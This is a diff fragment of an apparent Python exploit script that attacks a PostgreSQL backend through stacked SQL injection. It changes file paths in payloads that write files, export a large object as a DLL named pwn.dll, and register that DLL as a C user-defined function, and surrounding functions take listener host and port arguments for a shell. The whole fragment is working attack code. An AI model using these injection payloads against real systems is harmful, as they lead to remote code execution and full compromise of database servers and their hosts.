@@ -80,7 +80,7 @@ def send_shell_payload(targeturl, lhost, lport, smb_dll_path, dll_function):
 
 def send_write_payload(targeturl):
     print("Writing to target...")
-    sqli = "; copy (select $$pwned$$) to $$c:\\test.txt$$;--"
+    sqli = "; copy (select $$pwned$$) to $$c:\\windows\\temp\\test.txt$$;--"
 
     sendGetPayload(targeturl, sqli)
 
@@ -117,11 +117,11 @@ def send_lo_shell_payload(targeturl, lhost, lport, dll_path, dll_function):
         sendGetPayload(targeturl, inject_lo)
 
     print("Exporting LOID...")
-    export_lo = ";+select+lo_export(1337,+$$c:\\pwn.dll$$);--"
+    export_lo = ";+select+lo_export(1337,+$$c:\\windows\\temp\\pwn.dll$$);--"
     sendGetPayload(targeturl, export_lo)
 
     print("Creating UDF...")
-    create_udf = f";+create+or+replace+function+ezpwngine(text,+integer)+returns+void+as+$$c:\\pwn.dll$$,+$${dll_function}$$+language+C+strict;--"
+    create_udf = f";+create+or+replace+function+ezpwngine(text,+integer)+returns+void+as+$$c:\\windows\\temp\\pwn.dll$$,+$${dll_function}$$+language+C+strict;--"
     sendGetPayload(targeturl, create_udf)
 
     print("Triggering UDF...")
